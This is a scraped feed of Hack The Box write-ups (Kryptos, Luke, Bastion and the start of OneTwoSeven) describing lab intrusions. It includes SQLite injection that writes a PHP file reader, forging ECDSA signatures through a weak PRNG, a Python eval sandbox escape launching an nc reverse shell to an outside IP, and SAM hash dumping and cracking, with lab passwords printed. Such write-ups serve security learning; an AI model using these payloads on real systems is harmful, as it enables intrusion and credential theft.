Resolver,,,:/run/systemd/resolve:/usr/sbin/nologinsyslog:x:102:106::/home/syslog:/usr/sbin/nologinmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin_apt:x:104:65534::/nonexistent:/usr/sbin/nologinuuidd:x:105:109::/run/uuidd:/usr/sbin/nologinsshd:x:106:65534::/run/sshd:/usr/sbin/nologinrijndael:x:1001:1001:,,,:/home/rijndael:/bin/bashmysql:x:107:113:MySQL Server,,,:/nonexistent:/bin/false# python decrypthttp.py \"http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/file.php?x=/home/rijndael/user.txt\"�� ItablepwnpwnCREATE TABLE pwn (yolo text)# python decrypthttp.py \"http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/file.php?x=/home/rijndael/creds.txt\"�� IVimCrypt~02!REATE TABLE pwn (yolo text)�vnd]�K�yYC}�5�6gMRA�nD�@p;�-�# python decrypthttp.py \"http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/file.php?x=/home/rijndael/creds.old\"�� Irijndael / Password1BLE pwn (yolo text)Ok, so I can’t read the user.txt file, I’ll probably need to get a shell first.The creds files are interesting but the binary output from the PHP script makes it hard to determine what is the content of the file being read versus the binary from the sqlite database. I’ll just modify the script so it outputs the base64 content of file being read instead.# python decrypthttp.py \"http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&amp;bookid=1\" \";ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/test30.php' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('&lt;?php echo(\\\"---\\\" . base64_encode(file_get_contents(\\$_GET[\\\"x\\\"])) . \\\"---\\\"); ?&gt;');\"# python decrypthttp.py \"http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/test30.php?x=/home/rijndael/creds.old\"��O�%---cmlqbmRhZWwgLyBQYXNzd29yZDEK---ext)# python decrypthttp.py \"http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/test30.php?x=/home/rijndael/creds.txt\"��O�%---VmltQ3J5cHR+MDIhCxjkNctWEpo1RIBAcDuWLZMNqBB2bmRdwUviHHlZQ33ZNfs2Z01SQYtu---# echo -ne \"cmlqbmRhZWwgLyBQYXNzd29yZDEK\" | base64 -d &gt; creds.old# echo -ne \"VmltQ3J5cHR+MDIhCxjkNctWEpo1RIBAcDuWLZMNqBB2bmRdwUviHHlZQ33ZNfs2Z01SQYtu\" | base64 -d &gt; creds.txt# cat creds.oldrijndael / Password1# cat creds.txtVimCrypt~02!�vnd]�K�yYC}�5�6gMRA�nThe creds.txt file contains binary, running file on it I can see it’s a Vim encrypted file:# file creds.txtcreds.txt: Vim encrypted file dataVimCrypt~02! means that the blowfish cipher is used to encrypt the file.The https://dgl.cx/2014/10/vim-blowfish blog explains a vulnerability in the blowfish Vim implementation. The same IV is used for the first 8 block. Since the encrypted file is very small it means that the same IV is used for both files.If we look at the encrypted file, we see that the ciphertext is :930d a810 766e 645d c14b e21c 7959 437dd935 fb36 674d 5241 8b6eI can guess that the first part of both files is the same -&gt; rijndael (known plaintext)By XORing the first 8 bytes of both files I can recover the key stream then the plaintext:The password for rijndael is bkVBL8Q9HuBSpjI can log in and get the first flag:# ssh rijndael@kryptos.htbrijndael@kryptos.htb's password:Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage * Canonical Livepatch is available for installation.   - Reduce system reboots and improve kernel security. Activate at:     https://ubuntu.com/livepatchLast login: Wed Mar 13 12:31:55 2019 from 192.168.107.1rijndael@kryptos:~$ cat user.txt92b69...PrivescThe next target is obvious: there’s a python script running as root with a webserver on port 81.rijndael@kryptos:~/kryptos$ ps -ef | grep python3[...]root       772     1  0 Apr07 ?        00:00:07 /usr/bin/python3 /root/kryptos.pyroot       846   772  0 Apr07 ?        00:01:35 /usr/bin/python3 /root/kryptos.pySource code is in ~/kryptos/kryptos.py:import randomimport jsonimport hashlibimport binasciifrom ecdsa import VerifyingKey, SigningKey, NIST384pfrom bottle import route, run, request, debugfrom bottle import hookfrom bottle import response as respdef secure_rng(seed):    # Taken from the internet - probably secure    p = 2147483647    g = 2255412    keyLength = 32    ret = 0    ths = round((p-1)/2)    for i in range(keyLength*8):        seed = pow(g,seed,p)        if seed &gt; ths:            ret += 2**i    return ret# Set up the keysseed = random.getrandbits(128)rand = secure_rng(seed) + 1sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)vk = sk.get_verifying_key()def verify(msg, sig):    try:        return vk.verify(binascii.unhexlify(sig), msg)    except:        return Falsedef sign(msg):    return binascii.hexlify(sk.sign(msg))@route('/', method='GET')def web_root():    response = {'response':                {                    'Application': 'Kryptos Test Web Server',                    'Status': 'running'                }                }    return json.dumps(response, sort_keys=True, indent=2)@route('/eval', method='POST')def evaluate():    try:        req_data = request.json        expr = req_data['expr']        sig = req_data['sig']        # Only signed expressions will be evaluated        if not verify(str.encode(expr), str.encode(sig)):            return \"Bad signature\"        result = eval(expr, {'__builtins__':None}) # Builtins are removed, this should be pretty safe        response = {'response':                    {                        'Expression': expr,                        'Result': str(result)                    }                    }        return json.dumps(response, sort_keys=True, indent=2)    except:        return \"Error\"# Generate a sample expression and signature for debugging purposes@route('/debug', method='GET')def debug():    expr = '2+2'    sig = sign(str.encode(expr))    response = {'response':                {                    'Expression': expr,                    'Signature': sig.decode()                }                }    return json.dumps(response, sort_keys=True, indent=2)run(host='127.0.0.1', port=81, reloader=True)The first thing that jumps out is the eval() expression. It’s been somewhat “hardened” since the builtins are disabled, but there’s a way to bypass that. But first, I need to generate a valid signature for the expression to be evaluated.The second thing is the PRNG function secure_rng seems suspicious. I’m no crypto or math expert but when I run the function multiple times I see the same values generated quite often which indicates a broken PRNG.I took the function and put it in a new script to test the entropy of the values generated.import randomdef secure_rng(seed):    # Taken from the internet - probably secure    p = 2147483647    g = 2255412    keyLength = 32    ret = 0    ths = round((p-1)/2)    for i in range(keyLength*8):        seed = pow(g,seed,p)        if seed &gt; ths:            ret += 2**i    return retfor i in range(0,100):    seed = random.getrandbits(128)    rand = secure_rng(seed) + 1    print rand# python testrng.py100597636589611954557024882503270647266339457985371048072461716562621487133819675115792089237316195423570985008687907853269984665640564039457584007913129639931747045737014943196281103129088309082924322481713810090577145703276859424807825597636589611954557024882503270647266339457985371048072461716562621487544282495976365896119545570248825032706472663394579853710480724617165626214871211359027470457370149431962811031290883090829243224817138100905771457032768589009034[...]149409147402988639256220625817661816584864496342762018115429140655371783454911714940914740298863925622062581766181658486449634276201811542914065537188607221[...]7470457370149431962811031290883090829243224817138100905771457032768594248078129881829480597727851244125163532363316972899268552403623085828131074356036114238659763658961195455702488250327064726633945798537104807246171656262148712073505[...]298818294805977278512441251635323633169728992685524036230858281310743566909846159763658961195455702488250327064726633945798537104807246171656262148713381985113735228685074715981405515645441545414621612408569050452885728516384297124039637352286850747159814055156454415454146216124085690504528857285163842971240393735228685074715981405515645441545414621612408569050452885728516384378329292Some numbers repeat multiple times which is very unusual. I can test how many tries it takes on average to get a specific value (2 for example):import randomdef secure_rng(seed):    # Taken from the internet - probably secure    p = 2147483647    g = 2255412    keyLength = 32    ret = 0    ths = round((p-1)/2)    for i in range(keyLength*8):        seed = pow(g,seed,p)        if seed &gt; ths:            ret += 2**i    return rettries = 0for i in range(0,100):    while True:        tries = tries + 1        seed = random.getrandbits(128)        rand = secure_rng(seed) + 1        if rand == 2:            breakprint(\"It took on average %d times to get the same value twice\" % (tries / 100))# python testrng.pyIt took on average 23 times to get the same value twiceThis confirms that the PRNG is totally broken. So in theory I should able to submit any eval request and it’ll work after a few attempts. To test, I’ll do a local port forward with SSH first:# ssh -L 81:127.0.0.1:81 rijndael@kryptos.htbrijndael@kryptos.htb's password:Then I modify the script to take the expression from CLI argument and submit it until I get a valid signature:if len(sys.argv) != 2:    print \"Usage: expr.py &lt;expr&gt;\"headers = { \"Content-Type\": \"application/json\"}expr = sys.argv[1]tries = 0while True:    tries = tries + 1    seed = random.getrandbits(128)    rand = secure_rng(seed) + 1    sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)    vk = sk.get_verifying_key()    d = create_sig(expr)    data = '{ \"expr\": \\\"%s\\\", \"sig\": \"%s\" }' % (expr, json.loads(d)['response']['Signature'])    r = requests.post(\"http://127.0.0.1:81/eval\", data=data, headers=headers)    if 'Bad signature' not in r.text:        print \"Found a valid signature after %d tries\" % tries        print r.text        exit()The script works and after a few seconds I get a valid signature and the expression I submitted gets evaluated.# python expr.py \"'This '+'is'+' working'\"Found a valid signature after 4 tries{  \"response\": {    \"Expression\": \"'This '+'is'+' working'\",    \"Result\": \"This is working\"  }}Now I need to fix the last part: find a way to bypass the empty builtins set on the eval function. This a classic Python CTF challenge and there are multiple blogs showing various ways to jail escape this.# python expr.py \"[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.23 4444 &gt;/tmp/f')\"My eval works now and I get a reverse shell as root:# nc -lvnp 4444Ncat: Version 7.70 ( https://nmap.org/ncat )Ncat: Listening on :::4444Ncat: Listening on 0.0.0.0:4444Ncat: Connection from 10.10.10.129.Ncat: Connection from 10.10.10.129:44552./bin/sh: 0: can't access tty; job control turned off# iduid=0(root) gid=0(root) groups=0(root)# cat /root/root.txt6256d6..."
  },
  
  {
    "title": "Luke - Hack The Box",
    "url": "/posts/htb-writeup-luke/",
    "categories": "hackthebox, infosec",
    "tags": "ftp, php, ajenti, json, jwt",
    "date": "2019-09-14 00:00:00 +0800",
    





    
    "snippet": "Luke is a easy machine that doesn’t have a lot steps but we still learn a few things about REST APIs like how to authenticate to the service and get a JWT token and which headers are required when ...",
    "content": "Luke is a easy machine that doesn’t have a lot steps but we still learn a few things about REST APIs like how to authenticate to the service and get a JWT token and which headers are required when using that JWT. The rest of the box was pretty straighforward with some gobuster enumeration, finding PHP sources files with credentials then finally getting a shell through the Ajenti application.Summary  On the FTP, there’s a hint saying we need to get the source file for the web application  By using the .phps file extension we can get the config web application and some credentials  The credentials are used to authenticate to the API app on port 3000  With the API we can list the users and their plaintext passwords  The /management URI is protected with basic HTTP auth and we can log in with one of the user found with the API  We then get the root password from the config.json file  We can then log in as root on the Ajenti admin panel, then spawn a terminal window and retrieve the flagsPortscan# nmap -p- 10.10.10.137Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-26 16:39 EDTNmap scan report for luke.htb (10.10.10.137)Host is up (0.021s latency).Not shown: 65530 closed portsPORT     STATE SERVICE21/tcp   open  ftp22/tcp   open  ssh80/tcp   open  http3000/tcp open  ppp8000/tcp open  http-altFTP enumerationAnonymous FTP access is enabled there’s a file I can download: for_Chihiro.txtftp&gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.-r-xr-xr-x    1 0        0             306 Apr 14 12:37 for_Chihiro.txt226 Directory send OK.ftp&gt; get for_Chihiro.txtlocal: for_Chihiro.txt remote: for_Chihiro.txt200 PORT command successful. Consider using PASV.150 Opening BINARY mode data connection for for_Chihiro.txt (306 bytes).226 Transfer complete.306 bytes received in 0.00 secs (809.8323 kB/s)The file contains contains a hint regarding source files for the website application.As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources ofthe actual website I've created .Normally you should know where to look but hurry up because I will delete them soon because of our security policies !DerryWebsite enumerationThe site running on port 80 is just a generic site with no dynamic content that I can see.While running gobuster I find a couple of interesting directories:# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -s 200,204,301,302,307,401,403 -t 25 -x php -u http://10.10.10.137/LICENSE (Status: 200)/config.php (Status: 200)/css (Status: 301)/js (Status: 301)/login.php (Status: 200)/management (Status: 401)/member (Status: 301)/vendor (Status: 301)=====================================================2019/05/26 16:38:20 Finished=====================================================/management uses HTTP basic authentication and I don’t have the password yet. I’ll keep that in mind and come back to it later when I find the credentials./login.php shows a login page for some PHP web application.I tried a few sets of credentials and I wasn’t able to log in. A quick run with SQLmap didn’t reveal any easy SQL injection point either.The hint from the FTP file talked about source files so I did another gobuster pass using .phps as the extension since I knew the application was running on PHP based on the login.php file found. The .phps extension can be used to produce a color formatted output of the PHP source code without actually interpreting it. It’s definitely not something you want to leave on your production webservers especially if it contains credentials.# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -s 200,204,301,302,307,401,403 -t 25 -x phps -u http://10.10.10.137/config.phps (Status: 200)/login.phps (Status: 200)Allright, I found a couple of files and I see that the config.phps contains the root credentials for MySQL$dbHost = 'localhost';$dbUsername = 'root';$dbPassword  = 'Zk6heYCyv6ZE9Xcg';$db = \"login\";$conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die(\"Connect failed: %s\\n\". $conn -&gt; error);The login.phps file shows that the web application is incomplete: it doesn’t really do anything when you log in except set the session cookie. This probably means that I was just meant to find the password from the config.phps file and that I can ignore the login page.NodeJS appThe application running on port 3000 expects a JWT token in the Authorization header.I dirbursted the site to find API endpoints and found the following:# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -s 200,204,301,302,307,401,403 -t 25 -u http://10.10.10.137:3000/Login (Status: 200)/login (Status: 200)/users (Status: 200)=====================================================2019/05/26 16:41:55 Finished=====================================================I can’t reach /users because it expects an authorization header:{\"success\":false,\"message\":\"Auth token is not supplied\"}But I can log in and get a token with the following POST request;curl -XPOST http://10.10.10.137:3000/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"Zk6heYCyv6ZE9Xcg\"}'I get a JWT token back after logging in:{\"success\":true,\"message\":\"Authentication successful!\",\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU4ODg5NzM0LCJleHAiOjE1NTg5NzYxMzR9.hW8fCbdZ2S9L691y_OG5Kr0Bt2598JYjDlqLVrcOlj4\"}To authenticate, I add the following header to the GET request on / and /users:Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU4ODg5NzM0LCJleHAiOjE1NTg5NzYxMzR9.hW8fCbdZ2S9L691y_OG5Kr0Bt2598JYjDlqLVrcOlj4On GET /, I now get {\"message\":\"Welcome admin ! \"}GET /users shows a list of users:curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NDE3NjA1LCJleHAiOjE1Njg1MDQwMDV9.MXxjA5devINORQHlkRL17JH96uWO1VJIZMKZSDdf--U' http://10.10.10.137:3000/users[{\"ID\":\"1\",\"name\":\"Admin\",\"Role\":\"Superuser\"},{\"ID\":\"2\",\"name\":\"Derry\",\"Role\":\"Web Admin\"},{\"ID\":\"3\",\"name\":\"Yuri\",\"Role\":\"Beta Tester\"},{\"ID\":\"4\",\"name\":\"Dory\",\"Role\":\"Supporter\"}]I can query each individual user with GET /users/&lt;username&gt; and it returns their password:{\"name\":\"Admin\",\"password\":\"WX5b7)&gt;/rp$U)FW\"}{\"name\":\"Derry\",\"password\":\"rZ86wwLvx7jUxtch\"}{\"name\":\"Yuri\",\"password\":\"bet@tester87\"}{\"name\":\"Dory\",\"password\":\"5y:!xa=ybfe)/QD\"}Management pageI tried those credentials and found that I can log into the /management page with Derry (username is case sensitive)config.php and login.php contain the source we already have but config.json contains another set of credentials:Password: KpMasng6S5EtTy9ZI tried logging in as root by SSH but I wasn’t able to.AjentiI have one port left to check on the system. The Ajenti server admin panel runs on port 8000I can log in with root and KpMasng6S5EtTy9Z.Using the Terminal menu under Tools, I can get a shell and since I’m already running as root I can grab both flags."
  },
  
  {
    "title": "Bastion - Hack The Box",
    "url": "/posts/htb-writeup-bastion/",
    "categories": "hackthebox, infosec",
    "tags": "windows, mremoteng, backup, smb",
    "date": "2019-09-07 00:00:00 +0800",
    





    
    "snippet": "Bastion was an easy box where we had to find an open SMB share that contained a Windows backup. Once we mounted the disk image file, we could recover the system and SAM hive and then crack one of t...",
    "content": "Bastion was an easy box where we had to find an open SMB share that contained a Windows backup. Once we mounted the disk image file, we could recover the system and SAM hive and then crack one of the user’s password. An OpenSSH service was installed on the machine so we could SSH in with the credentials and do further enumeration on the box. We then find a mRemoteNG configuration file that contains encrypted credentials for the administrator. The system flag blood was still up for grab when I reached that stage so instead of reversing the encryption for the configuration file I just installed the mRemoteNG application on a Windows VM, copied the config file over and was able to log in as administrator.Summary  An open SMB share contains the full backup of a Windows machine  The system and SAM hive can be recovered and then we can crack the L4mpje user hash  mRemoteNG is installed and the credentials for the administrator are saved in the configuration fileTools used  https://github.com/libyal/libvhdiPortscanOpenSSH is running on the Windows machine. As this is not a standard Windows service, I make note of it as this might be needed to log in later when we find credentials.# nmap -sC -sV -p- 10.10.10.134Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-28 10:01 EDTNmap scan report for bastion.htb (10.10.10.134)Host is up (0.0097s latency).Not shown: 65522 closed portsPORT      STATE SERVICE      VERSION22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)| ssh-hostkey:|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)135/tcp   open  msrpc        Microsoft Windows RPC139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open  msrpc        Microsoft Windows RPC49665/tcp open  msrpc        Microsoft Windows RPC49666/tcp open  msrpc        Microsoft Windows RPC49667/tcp open  msrpc        Microsoft Windows RPC49668/tcp open  msrpc        Microsoft Windows RPC49669/tcp open  msrpc        Microsoft Windows RPC49670/tcp open  msrpc        Microsoft Windows RPCService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsSMB shareThere is a Backups SMB share that I have read and write to:# smbmap -u invalid -H 10.10.10.134[+] Finding open SMB ports....[+] Guest SMB session established on 10.10.10.134...[+] IP: 10.10.10.134:445\tName: bastion.htb\tDisk                                                  \tPermissions\t----                                                  \t-----------\tADMIN$                                            \tNO ACCESS\tBackups                                           \tREAD, WRITE\tC$                                                \tNO ACCESS\tIPC$                                              \tREAD ONLYChecking out the Backups share, I see a WindowImageBackup backup directory and note.txt:smb: \\&gt; ls  .                                   D        0  Sun Apr 28 10:04:03 2019  ..                                  D        0  Sun Apr 28 10:04:03 2019  note.txt                           AR      116  Tue Apr 16 06:10:09 2019  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019  WindowsImageBackup                  D        0  Fri Feb 22 07:44:02 2019\t\t7735807 blocks of size 4096. 2780707 blocks availableThe note.txt says I don’t need to copy the entire backup file to our VM:# cat note.txtSysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.Instead of transferring all the files with smbclient I’ll just mount the remote share:# mount -t cifs //10.10.10.134/Backups /mnt/bastionPassword for root@//10.10.10.134/Backups:  *# ls -l /mnt/bastion/total 1-r-xr-xr-x 1 root root 116 Apr 16 06:10 note.txt-rwxr-xr-x 1 root root   0 Feb 22 07:43 SDT65CB.tmpdrwxr-xr-x 2 root root   0 Feb 22 07:44 WindowsImageBackupThe backup directory contains two .vhd files:'/mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351':total 5330560-rwxr-xr-x 1 root root   37761024 Feb 22 07:44 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd-rwxr-xr-x 1 root root 5418299392 Feb 22 07:45 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhdI use the vhdimount utility to mount the remote .vhd file to another directory on my system. This way I don’t have to download the entire file.I just follow the build instructions at https://github.com/libyal/libvhdi/wiki/Building:  apt install autoconf automake autopoint libtool pkg-config  ./synclibs.sh  ./autogen.sh  ./configure  make  make install  ldconfigI can now mount the remote image:# vhdimount /mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup\\ 2019-02-22\\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd /mnt/vhdvhdimount 20190309It mounts a single file and not the actual contents:# ls -ltotal 0-r--r--r-- 1 root root 15999492096 Apr 28 10:19 vhdi1I then use the mmls utility to display the partition layout and calculate the offset of the partition: Block size x Start -&gt; 512 * 128 = 65536# mmls -aB vhdi1DOS Partition TableOffset Sector: 0Units are in 512-byte sectors      Slot      Start        End          Length       Size    Description002:  000:000   0000000128   0031248511   0031248384   0014G   NTFS / exFAT (0x07)Then I mount the image to another directory, specifying the proper offset:# mount -o ro,noload,offset=65536 vhdi1 /mnt/bastion_backuproot@ragingunicorn:/mnt/vhd# ls -l /mnt/bastion_backup/total 2096729drwxrwxrwx 1 root root          0 Feb 22 07:39 '$Recycle.Bin'-rwxrwxrwx 1 root root         24 Jun 10  2009  autoexec.bat-rwxrwxrwx 1 root root         10 Jun 10  2009  config.syslrwxrwxrwx 2 root root         25 Jul 14  2009 'Documents and Settings' -&gt; /mnt/bastion_backup/Users-rwxrwxrwx 1 root root 2147016704 Feb 22 07:38  pagefile.sysdrwxrwxrwx 1 root root          0 Jul 13  2009  PerfLogsdrwxrwxrwx 1 root root       4096 Jul 14  2009  ProgramDatadrwxrwxrwx 1 root root       4096 Apr 11  2011 'Program Files'drwxrwxrwx 1 root root          0 Feb 22 07:39  Recoverydrwxrwxrwx 1 root root       4096 Feb 22 07:43 'System Volume Information'drwxrwxrwx 1 root root       4096 Feb 22 07:39  Usersdrwxrwxrwx 1 root root      16384 Feb 22 07:40  WindowsI now have access to the system and SAM hive and I dump the hashes from the database:/mnt/bastion_backup/Windows/System32/config# pwdump SYSTEM SAMAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::With John The Ripper I can crack the hash for user L4mpje: bureaulampje# john --format=NT -w=/usr/share/wordlists/rockyou.txt hash.txtUsing default input encoding: UTF-8Loaded 2 password hashes with no different salts (NT [MD4 128/128 AVX 4x3])Warning: no OpenMP support for this hash type, consider --fork=4Press 'q' or Ctrl-C to abort, almost any other key for status                 (Administrator)bureaulampje     (L4mpje)With that account I can SSH in and get the user flag:# ssh l4mpje@10.10.10.134l4mpje@10.10.10.134's password:Microsoft Windows [Version 10.0.14393](c) 2016 Microsoft Corporation. All rights reserved.l4mpje@BASTION C:\\Users\\L4mpje&gt;cd desktopl4mpje@BASTION C:\\Users\\L4mpje\\Desktop&gt;dir Volume in drive C has no label. Volume Serial Number is 0CB3-C487 Directory of C:\\Users\\L4mpje\\Desktop22-02-2019  16:27    &lt;DIR&gt;          .22-02-2019  16:27    &lt;DIR&gt;          ..23-02-2019  10:07                32 user.txt               1 File(s)             32 bytes               2 Dir(s)  11.389.775.872 bytes freel4mpje@BASTION C:\\Users\\L4mpje\\Desktop&gt;type user.txt9bfe57...Getting the administrator credentialsI do some recon and found the mRemoteNG application is installed on the system. mRemoteNG is a multi-protocol connection manager and allows users to connect to systems with different protocols like SSH, RDP, VNC, etc. As such, it supports saving the credentials locally in a configuration file.The XML configuration file is located here: C:\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG\\confCons.xmlI immediately see that it contains an RDP session configuration for user Administrator:&lt;Node Name=\"DC\" Type=\"Connection\" Descr=\"\" Icon=\"mRemoteNG\" Panel=\"General\"Id=\"500e7d58-662a-44d4-aff0-3a4f547a3fee\" Username=\"Administrator\" Domain=\"\"Password=\"aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==\"Hostname=\"127.0.0.1\"[...]The password is encrypted with AES in GCM mode with a hardcoded key in the .xml file, then base64 encoded. Because I was under time pressure to get the system flag, I decided to spin up a Windows VM and install mRemoteNG instead of trying to find a way to recover the password. I found some ruby script on packetstorm that decrypts the password but it only works for CBC mode and therefore was of no use for me here.I didn’t want to turn off my VPN connection from my Kali VM so I just routed my Commando VM to my Kali VM and natted out the connection to the HTB lab.Added a route in Windows:C:\\Users\\snowscan&gt;route add 10.10.10.0 mask 255.255.255.0 172.23.10.39 OK!Then added a NAT statement in Kali after enabling IPv4 routing:# echo 1 &gt; /proc/sys/net/ipv4/ip_forward# /sbin/iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE# /sbin/iptables -A FORWARD -i eth0 -o tun0 -j ACCEPTTesting connectivity from Commando VM:C:\\Users\\snowscan&gt;nc -nv 10.10.10.134 22(UNKNOWN) [10.10.10.134] 22 (?) openSSH-2.0-OpenSSH_for_Windows_7.9I installed mRemoteNG portable edition then replaced the confCons.xml with the one from the box. I then changed the Protocol from RDP to SSH:I can connect with the administrator credentials and get the system flag:"
  },
  
  {
    "title": "Onetwoseven - Hack The Box",
    "url": "/posts/htb-writeup-onetwoseven/",
    "categories": "hackthebox, infosec",
    "tags": "php, apt, mitm, swapfile, vim, sftp, ssh, port forwarding, sudo, web, linux, symlink",
    "date": "2019-08-31 00:00:00 +0800",
    





    
    "snippet": "OneTwoSeven starts with enumeration of various files on the system by creating symlinks from the SFTP server. After finding the credentials for the ots-admin user in a vim swap file, I get access t...",
    "content": "OneTwoSeven starts with enumeration of various files on the system by creating symlinks from the SFTP server. After finding the credentials for the ots-admin user in a vim swap file, I get access to the administration page by SSH port-forwarding my way in and then I have to use the addon manager to upload a PHP file and get RCE. The priv esc was pretty fun and unique: I had to perform a MITM attack against apt-get and upload a malicious package that executes arbitrary code as root.Summary  The sign up webpage provides SFTP credentials to the box  From SFTP we can create a symlink to the root directory than access it with the browser and the home folder  A vim swap file reveals the ots-admin password for the local administration page  We can also retrieve the PHP source code of the main page via the symlink trick  The local admin page can only be accessed from localhost but we can do port-tunneling with SSH to connect to it  A file upload feature in a PHP web application can be accessed directly even if it’s supposed to be disabled after encoding part of the URI  We get RCE by uploading a PHP file to the site  The apt-get update / upgrade command is in the sudoers file and runs as root without any password  We can craft a malicious package and force the server to use our box as a proxy to do a man-in-the-middle attack against aptDetailsPortscanNote: 60080 is filtered on the box, but may be listening locally. I’ll keep an eye on this later on.# nmap -sC -sV -p- 10.10.10.133Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-20 15:00 EDTNmap scan report for onetwoseven (10.10.10.133)Host is up (0.0091s latency).Not shown: 65532 closed portsPORT      STATE    SERVICE VERSION22/tcp    open     ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)| ssh-hostkey:|   2048 48:6c:93:34:16:58:05:eb:9a:e5:5b:96:b6:d5:14:aa (RSA)|   256 32:b7:f3:e2:6d:ac:94:3e:6f:11:d8:05:b9:69:58:45 (ECDSA)|_  256 35:52:04:dc:32:69:1a:b7:52:76:06:e3:6c:17:1e:ad (ED25519)80/tcp    open     http    Apache httpd 2.4.25 ((Debian))|_http-server-header: Apache/2.4.25 (Debian)|_http-title: Page moved.60080/tcp filtered unknownService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWeb enumerationThe website is some kind of hosting provider.At the bottom of the main page there’s a hint about throttling enforced on the system:On the Attribution page, there’s a note from the box creator confirming this: Special thanks to 0xEA31 for the fail2ban configuration that already powered Lightweight and CTF. Based on this information, I figure it’s very likely that I don’t need to run gobuster or do any heavy enumeration on the main page.When I click the sign up button, I get a personal account created automatically and get the credentials for SFTP.  Username: ots-4NzkzMDE  Password: ea879301The link to the user homepage is: http://onetwoseven.htb/~ots-4NzkzMDEAt the moment, there’s nothing on the page except a brick background.Checking out the SFTP serviceI can’t connect using SSH because only SFTP is allowed on port 22:# ssh ots-4NzkzMDE@10.10.10.133ots-4NzkzMDE@10.10.10.133's password:This service allows sftp connections only.Connection to 10.10.10.133 closed.I can log in with SFTP however:# sftp ots-4NzkzMDE@10.10.10.133ots-4NzkzMDE@10.10.10.133's password:Connected to ots-4NzkzMDE@10.10.10.133.sftp&gt;As expected the SFTP access provides a link to the user directory:sftp&gt; lspublic_htmlsftp&gt; cd public_html/sftp&gt; lsindex.htmlGathering some files via symlinkI can create a symlink to the filesystem root directory with:sftp&gt; ln -s / rootsftp&gt; ls -l-rw-r--r--    1 1001     1001          349 Feb 15 21:03 index.htmllrwxrwxrwx    1 1001     1001            1 Apr 22 01:07 rootIf I go in the root directory symlink I created, it returns me to the root of the SFTP.sftp&gt; cd rootsftp&gt; lspublic_htmlBut with the web browser however, when I browse to root I see a bunch of folders:I can’t go into etc, home or usr because I get a 403 Forbidden error message.But /var/www shows there’s two main web directories: html-admin and html.html is the main webpage I saw earlier, but html-admin contains a couple of different files, including a vim swap file: .login.php.swp# file .login.php.swp.login.php.swp: Vim swap file, version 8.0, pid 1861, user root, host onetwoseven, file /var/www/html-admin/login.phpA swap file is a binary file so I ran strings on it to clean it up and make it readable in a text editor:# strings .login.php.swp &gt; login.php.swpThe file contains a 